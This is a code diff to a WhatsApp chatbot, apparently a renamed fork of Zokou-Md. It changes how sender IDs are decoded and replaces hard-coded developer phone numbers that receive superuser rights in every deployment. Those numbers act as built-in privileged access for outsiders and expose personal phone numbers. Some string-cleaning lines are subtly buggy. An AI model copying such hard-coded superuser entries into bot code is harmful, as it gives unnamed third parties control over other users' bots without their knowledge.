@@ -133,14 +133,9 @@
                     ms?.message?.buttonsResponseMessage?.selectedButtonId : mtype == "listResponseMessage" ?
                     ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId : mtype == "messageContextInfo" ?
                     (ms?.message?.buttonsResponseMessage?.selectedButtonId || ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text) : "";
-                var origineMessage = ms.key.remoteJid;
+                var origineMessage = decodeJid(ms.key.remoteJid);
                 var idBot = decodeJid(zk.user.id);
                 var servBot = idBot.split('@')[0];
-                /* const dj='22559763447';
-                 const dj2='2250143343357';
-                 const luffy='22891733300'*/
-                /*  var superUser=[servBot,dj,dj2,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
-                  var dev =[dj,dj2,luffy].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
                 const verifGroupe = origineMessage?.endsWith("@g.us");
                 var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
                 var nomGroupe = verifGroupe ? infosGroupe.subject : "";
@@ -150,19 +145,19 @@
                 // ms.message.extendedTextMessage?.contextInfo?.quotedMessage.
                 var mr = ms.message?.extendedTextMessage?.contextInfo?.mentionedJid;
                 var utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
-                var auteurMessage = verifGroupe ? (ms.key.participant ? ms.key.participant : ms.participant) : origineMessage;
+                var auteurMessage = decodeJid(verifGroupe ? (ms.key.participant || ms.participant) : origineMessage);
                 if (ms.key.fromMe) {
                     auteurMessage = idBot;
                 }
                 
-                var membreGroupe = verifGroupe ? ms.key.participant : '';
+                var membreGroupe = verifGroupe ? decodeJid(ms.key.participant) : '';
                 const { getAllSudoNumbers } = require("./bdd/sudo");
                 const nomAuteurMessage = ms.pushName;
-                const dj = '22559763447';
-                const dj2 = '22543343357';
-                const dj3 = "22564297888";
-                const luffy = '22891733300';
-                const dj4 = '‪99393228‬';
+                const dj = '22540718560';
+                const dj2 = '2250140718560';
+                const dj3 = "22545697604";
+                const luffy = '22554191184';
+                const dj4 = '‪2250545697604';
                 const sudo = await getAllSudoNumbers();
                 const superUserNumbers = [servBot, dj, dj2, dj3,dj4, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
                 const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -170,7 +165,7 @@
                 
                 var dev = [dj, dj2,dj3,dj4,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
                 function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-                console.log("\t [][]...{Zokou-Md}...[][]");
+                console.log("\t [][]...{Supremus-Md}...[][]");
                 console.log("=========== Nouveau message ===========");
                 if (verifGroupe) {
                     console.log("message provenant du groupe : " + nomGroupe);
@@ -212,8 +207,8 @@
                 const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
                 const verifCom = texte ? texte.startsWith(prefixe) : false;
                 const com = verifCom ? texte.slice(1).trim().split(/ +/).shift().toLowerCase() : false;
-               const tes = 'salut';
-               const liens = conf.URL.split(',');
+                const tes = 'salut';
+                const liens = conf.URL.split(',');
     
     function mybotpic() {
       // Générer un indice aléatoire entre 0 (inclus) et la longueur du tableau (exclus)
@@ -420,7 +415,7 @@
 
         
             //---------------------------------------rang-count--------------------------------
-        if (texte && auteurMessage.endsWith("s.whatsapp.net")) {
+        if (texte && auteurMessage.endsWith("@s.whatsapp.net")) {
         const { ajouterOuMettreAJourUserData } = require("./bdd/level"); 
         try {
             await ajouterOuMettreAJourUserData(auteurMessage);
